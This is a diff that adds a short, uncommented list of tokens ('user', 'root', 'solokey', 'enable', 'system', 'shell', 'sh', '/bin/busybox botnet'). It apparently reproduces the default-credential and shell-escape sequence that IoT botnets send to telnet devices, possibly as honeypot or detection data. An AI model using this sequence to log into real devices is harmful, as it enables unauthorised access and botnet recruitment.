@@ -1,0 +1,14 @@
+user
+
+user
+enable
+system
+shell
+root
+
+solokey
+enable
+system
+shell
+sh
+/bin/busybox botnet
